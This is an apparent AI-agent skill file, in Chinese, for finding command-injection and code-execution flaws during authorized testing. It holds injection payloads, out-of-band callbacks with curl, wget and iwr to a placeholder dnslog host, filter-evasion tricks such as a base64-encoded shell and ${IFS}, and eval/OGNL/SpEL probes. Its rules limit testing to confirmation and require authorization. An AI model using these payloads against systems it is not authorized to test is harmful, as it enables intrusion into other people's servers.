---
name: hunt-rce
description: 命令注入/代码执行挖掘：注入点识别（ping/导出/文件处理等功能面）、四类判定 oracle（回显/时间/带外/状态）、无回显外带通道、各语言拼接语法差异
whenToUse: 摸到会起子进程或拼表达式的功能（连通性检测/报表导出/文件转换/日志过滤）时
role: vuln-scan
enabled: true
---

# 命令注入 / 代码执行

## 注入点识别（按功能面找，比按参数找快）

| 功能面 | 典型后端 | 信号 |
|---|---|---|
| 连通性检测（ping/traceroute/telnet 探活） | `shell_exec("ping ".$ip)` | 网络工具配置页、监控自定义探测 |
| 文件处理（解压/转换/预览） | unzip/ffmpeg/imagemagick/libreoffice 拼文件名 | 带原文件名进命令行的上传后处理 |
| 报表导出 | wkhtmltopdf/pandoc 拼参数 | "导出 PDF"且 URL 参数进文件名 |
| 日志/过滤查询 | grep/awk 拼用户输入 | 审计日志页的自定义过滤 |
| 运维后台 | 计划任务/诊断工具输入框 | "执行命令""检查更新"类按钮 |

## 判定 oracle（无害优先，逐级升级）

1. **回显**：`;id` / `$(id)` / `` `id` `` / `| id` / `&& id` —— 输出出现在响应里即定性
2. **时间**：`;sleep 5` / `| timeout 5 ping -n 5 127.1`（Win）—— 响应延迟 5s±，连测 3 次对照基线
3. **带外**：`` `curl http://<dnslog>/rce` `` / `$(wget http://<dnslog>/rce)` / PowerShell `iwr http://<dnslog>/rce` —— 回连即定性，无回显场景首选
4. **写文件侧证**（需授权）：`;echo rce > <webroot可访问路径>/rce.txt` 再 GET 确认 —— 证明跨到 web 权限

## 分隔符/语法矩阵（按目标 OS 选）

| Linux | Windows | 语义 |
|---|---|---|
| `;` | `&` | 顺序执行（前命令失败也执行） |
| `&&`/`\|\|` | `&&`/`\|\|` | 条件执行 |
| `\|` | `\|` | 管道 |
| `` `cmd` `` `$(cmd)` | 无（靠 `&`） | 命令替换 |
| `%0a`（换行） | `%0a` | 绕过对分号的过滤 |
| `${IFS}` 替代空格 | 无需 | 绕空格过滤 |

过滤对抗：拦 `bin/bash` → `echo YmFzaA==|base64 -d|sh`；拦空格 → `${IFS}`/`<`；拦关键字 → 拆接 `a=cu;b=rl;$a$b`。

## 代码执行入口（表达式类，区别于命令注入）

| 入口 | 特征 | 首探 |
|---|---|---|
| eval/assert/`Function()` | 参数直接进 eval | `eval('echo 7*7;')` 形态的数字运算探针 |
| PHP filter_var / preg_replace /e | 校验函数自身漏洞 | `php://input` + 特定 flag |
| Java SpEL/OGNL | `#{}`/`%{}` 语法进模板或注解 | `%{1+1}` / `#{1+1}` 回显 2 |
| Python eval/exec、Node vm | 参数进解释器 | `7*7` 表达式探针 |
| Perl/`open(|)` | 文件名进 open | 文件名尾接管道符 |

（OGNL/SpEL 深入利用见框架技能与 hunt-deserialization；SSTI 见 hunt-ssti。）

## 纪律

- 探测只到"回连/延迟/回显"即定性，不 cat 敏感文件、不反弹 shell（反弹需单独授权）
- 带外域名用自己的 dnslog/interactsh，不用公共服务公共实例
- 回填：category=rce，usage 写清"注入位→分隔符→oracle→证据"，verified_note 放回连记录

<!-- 改编自: PayloadsAllTheThings(Command Injection / Remote Code Execution) + OWASP 命令注入速查, 2026-10-31 -->
